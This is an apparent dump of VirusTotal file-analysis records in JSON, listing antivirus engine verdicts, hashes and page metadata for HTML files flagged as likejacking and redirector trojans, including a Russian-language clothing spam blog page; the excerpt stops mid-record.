          "result": "JS.Faceliker.NC",
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.HTML.RceGen5.nq",
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "JS:Trojan.JS.Likejack.A",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5000",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Trojan.Generic-Script.Save.3e62ca52",
          "method": "blacklist",
          "engine_update": "20231122"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.127.50309",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.127.50307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Agent.GHMK [many]",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231023"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.585",
          "result": "JS.Agent.FY",
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "ISB.Malscript!gen3",
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.117",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28291",
          "result": "JS/TrojanClicker.Agent.NGC",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.476",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "HTML:Autolike-B [Trj]",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.Script.Generic",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.Agent.GHMK",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.AgentClick.dchycs",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231122"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.Agent.GHMK",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.FaceLiker/JS!1.A0E3 (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.Agent.GHMK (B)",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Malware.JS/FaceLiker.EB.19",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "JS.Click.370",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.Agent.GHMK",
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.Agent.GHMK",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Mal/FBJack-R",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan-Clicker.JS.Agent",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231123-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "JS/Faceliker.A!Eldorado",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "JS/FaceLiker.EB.19",
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Script.Ks.Malware.2990",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.148.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36201",
          "result": "TrojWare.JS.Clickjack.AH@7phcf4",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23100.2009",
          "result": "TrojanClicker:JS/Faceliker.AR",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "JS.Z.Agent.37516.B",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Script.Generic",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36861B:27.33971",
          "result": "HTML.Trojan.Clickjack.B",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1700731866",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231121"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": "Trojan/JS.Faceliker.SC193651",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "JS/Faceliker.a",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-11-24.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Heur:Trojan.Script.LS_Gencirc.7058808.0",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=82)",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.js.likejack.a",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "JS/FBJack.I!tr",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "HTML:Autolike-B [Trj]",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231123"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      }
    },
    "type": "file",
    "id": "afdd0e4dde2a95cab326532cba33923c0c581a34800798b8396852d29fcd492f",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/afdd0e4dde2a95cab326532cba33923c0c581a34800798b8396852d29fcd492f"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fe0a25047c7018f82ae1"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T1364396E31C4A141E1A12F5CEF8327F1CFC0E49BAE956C355E8B99E5FA6C1A81591C30E",
      "vhash": "htm:cd67118ee66f93c9fa268174d4b36077",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [],
      "last_modification_date": 1706327604,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 58269,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.gen2",
        "popular_threat_category": [
          {
            "count": 16,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 2,
            "value": "gen2"
          }
        ]
      },
      "html_info": {
        "iframes": [
          {
            "attributes": {
              "name": "comment-editor",
              "class": "blogger-iframe-colorize blogger-comment-from-post",
              "height": "410px",
              "width": "100%",
              "allowtransparency": "true",
              "id": "comment-editor",
              "frameborder": "0"
            }
          }
        ],
        "title": "купить брендовую одежду через интернет: Одежда из китая в украину интернет магазин",
        "hrefs": [
          "https://www.blogger.com/static/v1/widgets/3822632116-css_bundle_v2.css",
          "http://paitaucludta.blogspot.com/favicon.ico",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_5154.html",
          "http://paitaucludta.blogspot.com/feeds/posts/default",
          "http://paitaucludta.blogspot.com/feeds/posts/default?alt=rss",
          "https://www.blogger.com/feeds/5535145207941874172/posts/default",
          "http://paitaucludta.blogspot.com/feeds/5835643740191144361/comments/default",
          "http://farm8.staticflickr.com/7457/11118765454_38a1f79be4_m.jpg",
          "https://www.blogger.com/dyn-css/authorization.css?targetBlogID=5535145207941874172&zx=e8fb072e-5f1b-4b8c-940c-33f90294cef1",
          "http://paitaucludta.blogspot.com/",
          "https://www.blogger.com/profile/01588029073794242748",
          "https://www.blogger.com/post-edit.g?blogID=5535145207941874172&postID=5835643740191144361&from=pencil",
          "https://www.blogger.com/share-post.g?blogID=5535145207941874172&postID=5835643740191144361&target=email",
          "https://www.blogger.com/share-post.g?blogID=5535145207941874172&postID=5835643740191144361&target=blog",
          "https://www.blogger.com/share-post.g?blogID=5535145207941874172&postID=5835643740191144361&target=twitter",
          "https://www.blogger.com/share-post.g?blogID=5535145207941874172&postID=5835643740191144361&target=facebook",
          "https://www.blogger.com/share-post.g?blogID=5535145207941874172&postID=5835643740191144361&target=pinterest",
          "https://www.blogger.com/comment-iframe.g?blogID=5535145207941874172&postID=5835643740191144361",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_6056.html",
          "http://paitaucludta.blogspot.com/2013/12/tapout.html",
          "javascript:void(0)",
          "http://paitaucludta.blogspot.com/2014/",
          "http://paitaucludta.blogspot.com/2014/01/",
          "http://paitaucludta.blogspot.com/2013/",
          "http://paitaucludta.blogspot.com/2013/12/",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_6759.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_8353.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_6787.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_8438.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_798.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_4280.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_2228.html",
          "http://paitaucludta.blogspot.com/2013/12/3.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_8247.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_4441.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_3603.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_461.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_2829.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_7460.html",
          "http://paitaucludta.blogspot.com/2013/12/jack-daniels.html",
          "http://paitaucludta.blogspot.com/2013/12/drop-dead_30.html",
          "http://paitaucludta.blogspot.com/2013/12/boxing-team.html",
          "http://paitaucludta.blogspot.com/2013/12/ac-dc.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_9217.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_1794.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_2638.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_7920.html",
          "http://paitaucludta.blogspot.com/2013/12/nike-cr-slim-collar-pique.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_2904.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_2009.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_5935.html",
          "http://paitaucludta.blogspot.com/2013/12/2013_30.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_494.html",
          "http://paitaucludta.blogspot.com/2013/12/tommy-hilfiger-polo_30.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_278.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_4142.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_1487.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_728.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_2930.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_5940.html",
          "http://paitaucludta.blogspot.com/2013/12/sweet-mama_30.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_30.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_9512.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_148.html",
          "http://paitaucludta.blogspot.com/2013/12/2013_12.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_6816.html",
          "http://paitaucludta.blogspot.com/2013/12/tommy-hilfiger-polo.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_7368.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_7313.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_2637.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_9826.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_3245.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_6196.html",
          "http://paitaucludta.blogspot.com/2013/12/sweet-mama.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_7493.html",
          "http://paitaucludta.blogspot.com/2013/12/2011.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_4997.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_5945.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_6105.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_3058.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_7034.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_8488.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_1789.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_5000.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_5801.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_7097.html",
          "http://paitaucludta.blogspot.com/2013/12/drop-dead.html",
          "http://paitaucludta.blogspot.com/2013/12/volkswagen-polo-vs-kia-rio.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_3126.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_7891.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_6805.html",
          "http://paitaucludta.blogspot.com/2013/12/ralph-lauren-2013-swim.html",
          "http://paitaucludta.blogspot.com/2013/12/nike.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_1680.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_4812.html",
          "http://paitaucludta.blogspot.com/2013/12/angry-birds_12.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_5485.html",
          "http://paitaucludta.blogspot.com/2013/12/mountain.html",
          "http://paitaucludta.blogspot.com/2013/12/dress-code.html",
          "http://paitaucludta.blogspot.com/2013/12/blog-post_5470.html"
        ],
        "scripts": [
          {
            "attributes": {
              "src": "http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript",
              "language": "javascript"
            },
            "sha256": "531c9aeaf5842d990411be7912cff738ea731c8fc79c3b8a78b83644783bc31e"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "33c0ec3f739868ef48195ef02173c9aa84cf8cd0259fcf46dd622baf42330f4d"
          },
          {
            "attributes": {
              "src": "https://apis.google.com/js/plusone.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "1d59b7b71443086236d670e82c078fb28a2bc7e04beb311ea3f6081c2815dc4a"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "fbf315cef118826467b651c1fd9b2ae86d7439b98d3bcda8034c1b61e9b77145"
          },
          {
            "attributes": {
              "src": "https://www.blogger.com/static/v1/jsbin/3155380561-comment_from_post_iframe.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "84af9ca9cd5a6779caee8d95d127a56d6290978a60865bbd2c650f42ca32f030"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "72c91d23b57f12144f95e7eb0e66d1ea5ca17c4d86f7c63fa521bb41b3802e66"
          },
          {
            "attributes": {
              "src": "https://www.blogger.com/static/v1/widgets/1461610695-widgets.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "972005f6039daeb8388105e3ad950a66e5f5bccf1ecd7174540eddadc58261ed"
          }
        ],
        "html_meta": {
          "viewport": [
            "width=1100"
          ],
          "generator": [
            "blogger"
          ]
        }
      },
      "last_submission_date": 1696595256,
      "reputation": -7,
      "trid": [
        {
          "file_type": "HyperText Markup Language",
          "probability": 100
        }
      ],
      "sha256": "321ccd58cd40f4de982212f598e86530e104de38f3091c943ec0f75c3340e984",
      "type_extension": "html",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1696595256,
      "unique_sources": 1,
      "first_submission_date": 1696595256,
      "ssdeep": "768:2rlQpHvvCIooV/mMjWoVZuLiCh2fs/MrRu8F+wi2:2qHv7oS/meuLwsqu8FD",
      "md5": "79303889a772182ca2069f6097f2ca30",
      "sha1": "6c90451e89ada2df6b42bcee54740d33098ce4d5",
      "magic": "HTML document, Unicode text, UTF-8 text, with very long lines (8460u)",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 4,
        "failure": 0,
        "malicious": 27,
        "undetected": 29
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.JS.Agent.UUM",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.JS.Agent.UUM",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "JS.Redirector.Q",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "McAfee": {
          "category": "timeout",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.JS.Agent.UUM",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4968",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Trojan.Generic-Script.Save.8eb4053d",
          "method": "blacklist",
          "engine_update": "20230926"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.118.49795",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.118.49796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.551",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": "JS/Agent.ARK!Eldorado",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Trojan.Gen.NPE",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.111",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231002"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28027",
          "result": "JS/Agent.OON",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "JS:Redirector-CCQ [Trj]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.JS.Agent.UUM",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.Redirector.bqiube",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
